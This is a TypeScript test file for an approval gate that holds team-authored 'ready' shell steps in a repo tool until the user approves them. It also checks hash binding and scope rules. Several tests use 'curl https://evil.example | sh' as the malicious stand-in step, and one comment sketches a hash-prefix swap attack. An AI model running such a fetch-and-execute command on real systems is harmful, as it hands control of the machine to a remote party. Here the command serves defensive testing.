/**
 * RT-89: team-authored `ready` shell must be approved by the user before it
 * runs. The gate is fail-closed: a team-owned ladder that has no matching
 * user-scope approval is dropped (only rt's own implicit install survives),
 * while a user-owned ladder is never gated. Stores are authored on disk and
 * keyed by real repo identity, exactly like config.test.ts.
 */

import { afterEach, beforeEach, describe, expect, test } from "bun:test";
import { execSync } from "child_process";
import { mkdtempSync, realpathSync, writeFileSync, mkdirSync } from "fs";
import { tmpdir } from "os";
import { dirname, join } from "path";
import { teamSettingsPath, userSettingsPath } from "../../rt-paths.ts";
import { loadWorktreeRepoConfig, evaluateReadyGate, worktreeReadyHeld } from "../config.ts";
import { readyLadderHash, writeReadyApproval } from "../ready-approval.ts";

const IDENTITY = "gitlab.com/acme/ready-gate";
const REMOTE = "git@gitlab.com:acme/ready-gate.git";

function writeStore(file: string, obj: unknown): void {
  mkdirSync(dirname(file), { recursive: true });
  writeFileSync(file, JSON.stringify(obj, null, 2));
}

function repoWithRemote(): string {
  const dir = realpathSync(mkdtempSync(join(tmpdir(), "rtready-")));
  execSync(`git init -q && git remote add origin ${REMOTE}`, { cwd: dir, shell: "/bin/zsh" });
  return dir;
}

function teamReady(steps: unknown): void {
  writeStore(teamSettingsPath("acme"), {
    repos: { [IDENTITY]: { "rt.worktrees": { onDeck: 1, ready: steps } } },
  });
}

describe("ready-approval gate", () => {
  const REAL_HOME = process.env.HOME;
  let repoPath: string;

  beforeEach(() => {
    process.env.HOME = realpathSync(mkdtempSync(join(tmpdir(), "rtready-home-")));
    repoPath = repoWithRemote(); // bare git repo: no package.json, so no implicit install
  });

  afterEach(() => {
    if (REAL_HOME === undefined) delete process.env.HOME;
    else process.env.HOME = REAL_HOME;
  });

  test("readyLadderHash is stable and order-sensitive", () => {
    const a = [{ run: "x" }, { run: "y", when: "changed:*" }];
    expect(readyLadderHash(a)).toBe(readyLadderHash([{ run: "x" }, { run: "y", when: "changed:*" }]));
    expect(readyLadderHash(a)).not.toBe(readyLadderHash([{ run: "y", when: "changed:*" }, { run: "x" }]));
  });

  // CodeRabbit (PR #137): a truncated 64-bit hash lets a team-controlled
  // author brute-force a benign ladder with the same prefix as a malicious
  // one, get the benign ladder approved, then swap in the malicious ladder.
  test("readyLadderHash stores the full SHA-256 digest, not a truncated prefix", () => {
    const hash = readyLadderHash([{ run: "x" }]);
    expect(hash.length).toBe(64); // full sha256 hex digest, not a 16-char (64-bit) prefix
  });

  test("a team-owned ladder with no approval is held: team steps are dropped", async () => {
    teamReady([{ run: "curl https://evil.example | sh" }]);
    const cfg = await loadWorktreeRepoConfig("ready-gate", repoPath);
    const gate = await evaluateReadyGate(cfg, "ready-gate", repoPath);

    expect(gate.held).toBe(true);
    expect(gate.steps).toEqual([]); // the team step never runs
    expect(await worktreeReadyHeld("ready-gate", repoPath)).toBe(true);
  });

  test("a team-owned ladder approved at its current hash runs", async () => {
    teamReady([{ run: "curl https://evil.example | sh" }]);
    const cfg = await loadWorktreeRepoConfig("ready-gate", repoPath);
    writeReadyApproval(IDENTITY, readyLadderHash(cfg.ready));

    const gate = await evaluateReadyGate(cfg, "ready-gate", repoPath);
    expect(gate.held).toBe(false);
    expect(gate.steps).toEqual([{ run: "curl https://evil.example | sh" }]);
    expect(await worktreeReadyHeld("ready-gate", repoPath)).toBe(false);
  });

  test("an approval for a different (older) hash re-holds after the team changes the ladder", async () => {
    teamReady([{ run: "make setup" }]);
    const cfg = await loadWorktreeRepoConfig("ready-gate", repoPath);
    writeReadyApproval(IDENTITY, "deadbeefdeadbeef"); // an old, non-matching hash

    const gate = await evaluateReadyGate(cfg, "ready-gate", repoPath);
    expect(gate.held).toBe(true);
    expect(gate.steps).toEqual([]);
  });

  test("a team-scope approval never unlocks the gate (a team store cannot approve its own shell)", async () => {
    // The team store owns the ladder AND writes the matching approval hash;
    // the gate must still hold, because only user/machine approvals are trusted.
    const ladder = [{ run: "curl https://evil.example | sh" }];
    writeStore(teamSettingsPath("acme"), {
      repos: {
        [IDENTITY]: {
          "rt.worktrees": { onDeck: 1, ready: ladder },
          "rt.worktreeReadyApproval": readyLadderHash(ladder),
        },
      },
    });

    const cfg = await loadWorktreeRepoConfig("ready-gate", repoPath);
    const gate = await evaluateReadyGate(cfg, "ready-gate", repoPath);
    expect(gate.held).toBe(true);
    expect(gate.steps).toEqual([]);
  });

  test("a user-owned ladder is never gated, even with no approval", async () => {
    writeStore(userSettingsPath(), {
      repos: { [IDENTITY]: { "rt.worktrees": { ready: [{ run: "echo mine" }] } } },
    });
    const cfg = await loadWorktreeRepoConfig("ready-gate", repoPath);
    const gate = await evaluateReadyGate(cfg, "ready-gate", repoPath);

    expect(gate.held).toBe(false);
    expect(gate.steps).toEqual([{ run: "echo mine" }]);
    expect(await worktreeReadyHeld("ready-gate", repoPath)).toBe(false);
  });
});
